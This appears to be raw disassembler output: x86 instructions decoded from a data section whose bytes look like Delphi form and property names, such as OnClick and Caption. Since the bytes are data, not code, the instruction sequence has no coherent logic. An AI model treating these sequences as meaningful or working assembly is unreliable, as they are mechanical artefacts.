add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
add al dl
out 0x43 eax
add [ eax ] cl
pop esp
jge r-xdata
or al 0x4f
jns r-xdata
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jpo r-xdata
push ebp
jo r-xdata
jb r-xdata
inc esp
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
jmp 0xffffffffe9c5e881
add [ eax ] al
aam 0xe7
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
inc esp
add al dl
cmp eax [ ebp ]
clc
or bh ch
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or [ ecx + 0x44 ] bh
jpe r-xdata
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
outsb
pop edx
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
inc ebx
add [ eax ] ah
je r-xdata
add [ eax ] al
push 0x61437261
jae r-xdata
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
add [ edi + ecx * 4 ] ah
jb r-xdata
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
add [ eax ] al
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
0xe9900043 0x43
or al 0xeb
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
int3
add [ eax ] eax
add [ eax ] al
add [ edx ] al
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x2f580040 ] al
xchg [ eax + eax - 0x34 ] eax
popad
jae r-xdata
push ss
inc edx
add [ eax + 0x27 ] ah
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ eax ] ch
sub [ eax + eax + 0x54 ] al
mov esp 0xc7d00044
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ edx + ecx * 8 + 0x44 ] bl
add [ eax ] cl
leave
inc esp
add ah cl
or al [ ebp ]
add ah ch
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add [ ecx + esi * 8 ] ah
inc esp
add [ eax + 0x580044f7 ] bh
add eax 0x2c640045
inc esp
add [ eax ] ah
sub eax 0x2d900044
inc esp
add al dh
add eax 0x5f40045
inc ebp
add [ esp + eax + 0x2e340045 ] ch
inc esp
add ah cl
xor [ ebp ] al
pushfd
push cs
inc ebp
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
or [ eax ] ch
inc esp
add [ edx + ebp + 0x44 ] al
add [ eax ] al
sub al [ eax + eax - 0x38 ]
sub eax [ eax + eax + 0x74 ]
sub al [ eax + eax + 0x24 ]
sub al [ eax + eax - 0x28 ]
sub al [ eax + eax + 0x2c ]
sub eax [ eax + eax + 0x8 ]
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
nop
das
inc esp
add al dl
das
inc esp
add [ eax + esi + 0x44 ] cl
add [ eax + esi ] al
inc esp
add [ eax + esi ] ch
inc esp
add [ eax - 0x3fffbbd0 ] cl
xor [ eax + eax + 0x34 ] al
das
inc esp
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc edx
add [ eax - 0x13ffbded ] dh
insb
jae r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
pop [ ecx ]
sub cl 0x44
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
push 0x43e8
add bh bh
int3
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ esi + 0x2f580040 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc esp
add al dl
cmp eax [ ebp ]
clc
outsd
insd
inc ebp
imul esi [ fs : eax + ebp * 2 - 0x18 ] 0x8b240043
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add eax [ ebp ]
and al 0x8f
inc ebp
add al bh
shr [ eax - 0x18 ] 0x43
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
adc [ edx ] al
add al 0x35
inc eax
add [ eax + 0x2f ] bl
popad
jae r-xdata
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0x27 ] ah
inc esp
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ eax ] ch
sub [ eax + eax + 0x54 ] al
mov esp 0xc7d00044
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ edx + ecx * 8 + 0x44 ] bl
add [ eax ] cl
leave
inc esp
add ah cl
or al [ ebp ]
add ah ch
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add [ ecx + esi * 8 ] ah
inc esp
add [ eax + 0x580044f7 ] bh
add eax 0x2c640045
inc esp
add [ eax ] ah
sub eax 0x2d900044
inc esp
add al dh
add eax 0x5f40045
inc ebp
add [ esp + eax + 0x2e340045 ] ch
inc esp
add ah cl
xor [ ebp ] al
pushfd
push cs
inc ebp
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
or [ eax ] ch
inc esp
add [ edx + ebp + 0x44 ] al
add [ eax ] al
sub al [ eax + eax - 0x38 ]
sub eax [ eax + eax + 0x74 ]
sub al [ eax + eax + 0x24 ]
sub al [ eax + eax - 0x28 ]
sub al [ eax + eax + 0x2c ]
sub eax [ eax + eax + 0x5 ]
push esp
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add eax 0x69644554
je r-xdata
sar [ ebx ] 0x1
inc ebp
add al bh
insb
jae r-xdata
add [ edi * 4 - 0xf53ffbc ] bl
inc esp
inc esp
add [ ebx + 0x1 ] ah
xchg [ eax + eax + 0x65 ] al
add [ eax ] eax
inc [ eax + 0x3e ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax + 0x64 ] al
add [ eax ] eax
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
adc [ esi ] bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x32ecff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
dec esp
cmp eax 0x10045
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add al [ eax ]
add [ eax + ebp * 8 ] bl
inc ebx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
0x43 0x0
or eax [ ebx + 0x6f ]
jb r-xdata
jb r-xdata
popad
jae r-xdata
add bh bh
adc al 0xca
inc esp
add [ eax ] dh
0x44
jb r-xdata
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
xchg [ eax + eax + 0x63 ] al
add [ eax ] eax
dec esp
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
outsd
je r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x700ffff ] ah
xor [ ebp ] eax
sbb al 0x32
inc esp
in al 0x6f
and [ esi ] 0x42
add [ eax ] dh
inc edx
pop ecx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xbc65646f
and eax [ esi ]
or al 0x2
add bh bh
cmp al 0x28
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
dec ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
shl bh 0x1
inc ebx
add [ ebx ] dl
add al [ eax ]
jmp [ eax + 0x28 ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + 0x6f ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add dh bh
cwde
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
[ eax - 0x37 ]
jae r-xdata
add bh bh
push 0x780044c9
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
je r-xdata
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
or al 0x86
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ eax ] cl
add al [ eax ]
dec [ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jl r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
outsb
je r-xdata
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc esp
add [ ecx + eax + 0x184ff00 ] al
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
inc esp
sub [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0x28ff0001
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and eax 0x61500b00
jb r-xdata
dec esp
imul ebp [ esi + 0x74 ] r-xdata
inc ebp
add [ eax + eax ] bh
[ eax + ecx * 8 ]
adc [ eax ] al
or eax 0x3cff0002
sub [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
sub [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add bh bh
sbb [ edx ] al
add bh bh
add [ eax + ecx * 8 + 0x44 ] dh
add [ eax + ecx * 8 + 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x65540400
js r-xdata
ja r-xdata
ja r-xdata
push esp
xor al [ ebp ]
aam 0x32
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
adc [ eax ] al
0xe8ff0000 0x44c9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
xchg esp eax
mov [ eax + eax + 0x40 ] 0x44e9
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xb4656c62
pop edx
inc esp
add [ edx + esi + 0x45 ] dl
add ah dl
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
je r-xdata
jb r-xdata
popad
jae r-xdata
push eax
popad
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov al [ 0x10044c9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
add [ eax ] al
js r-xdata
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
mov ah 0x5a
jb r-xdata
add [ eax + 0x1 ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0xc4287261
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
ja r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f070037 ] al
mov ah 0x5a
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942f0da
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
jpo r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
dec ebx
jns r-xdata
bound eax [ eax ]
mov eax eax
inc esp
inc ebx
ja r-xdata
dec edi
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
loopne r-xdata
jo r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
jns r-xdata
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
add al al
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
jb r-xdata
jb r-xdata
je r-xdata
push ebx
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
add al bl
add [ eax ] eax
mov ah 0x5a
jpe r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
int3
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] ch
inc ebx
add [ eax + eax ] dl
add [ eax ] al
shl [ ebp + 0x41 ] 0x0
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x43f344c0 ] cl
inc esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
jpo r-xdata
inc esp
outsd
ja r-xdata
add al dl
add [ eax ] al
call eax
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al bl
add [ eax ] al
inc esp
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc ecx
add [ ecx + esi - 0x5fefffbc ] dl
inc ecx
add ah bl
xor [ eax + eax - 0x8 ] al
xor [ eax + eax - 0x30 ] al
mov al [ 0xffffffffa5f80041 ]
inc ecx
add [ eax + 0x31 ] dh
inc esp
add [ edi - 0x57e3ffbf ] dl
inc ecx
add [ edx + esi - 0x569bffbc ] ah
inc ecx
add [ eax ] cl
fwait
inc ecx
add [ ebx + ebx * 4 ] ch
inc ecx
add [ eax - 0x65 ] dl
inc ecx
add ah ch
xor [ eax + eax + 0x5c ] eax
xor al [ eax + eax - 0x54 ]
sahf
inc ecx
add [ eax + 0x41 ] bh
add [ edx + esi + 0x44 ] bh
add [ eax ] dl
mov [ 0xffffffffa3e40041 ] eax
inc ecx
add [ eax + 0x1800402a ] ch
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] cl
inc ecx
add [ esp - 0x5ab7ffbf ] bl
inc ecx
add al ah
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc ecx
add ah cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] cl
pushfd
jb r-xdata
jb r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
and al 0x8b
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43f3e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 + 0x43 ] al
add [ eax ] al
add [ eax ] al
cmp al 0x10
add [ ebx + ecx * 4 ] ah
inc esp
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ edx + 0x40 ] dl
lea eax [ bx + si ]
aam 0xf2
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
jge r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
cmp [ ecx + 0x44 ] 0x0
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
add [ eax ] al
add [ eax ] al
adc dh dh
inc ebx
add [ eax - 0xa ] ah
inc ebx
add [ edx + eax ] ah
je r-xdata
add [ eax ] al
push 0x140043f4
outsb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsd
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc ebp
xor eax 0xc300040
imul ebp [ esi + 0x67 ] 0xf4849073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
add al 0x52
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
arpl [ ebp + eax + 0x54 ] si
jb r-xdata
pop es
jb r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
fcomp [ edx - 0x6ff7ffbf ]
inc ecx
add [ eax ] dl
popfd
inc ecx
insb
add [ 0x65646e49 ] al
js r-xdata
xor al 0x44
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ esi + 0x34f80040 ] al
inc eax
outsd
inc eax
add al bh
xor al 0x40
add [ 0x35040040 ] dh
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ edx + esi + 0x40 ] bl
add al bl
0x90080041 0x41
adc [ ebp - 0x63f7ffbf ] bl
jb r-xdata
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add al dl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
adc [ edx ] al
add al 0x35
inc eax
add [ eax ] dh
or al 0x45
je r-xdata
inc ecx
add [ edi + edi ] al
imul ebp [ esi + 0x67 ] 0x43f3e873
add [ eax + 0x4166 ] ch
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ edi * 4 - 0xf53ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
inc ebx
je r-xdata
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add ah bl
xor eax [ eax + eax - 0x1c ]
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
insb
jae r-xdata
add [ esp + edx * 4 + 0x44 ] dl
add [ ebp - 0xaffffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
test [ ebx ] 0x60
test [ ebx ] 0x64
add al [ eax ]
sub_43f06f
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070030 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
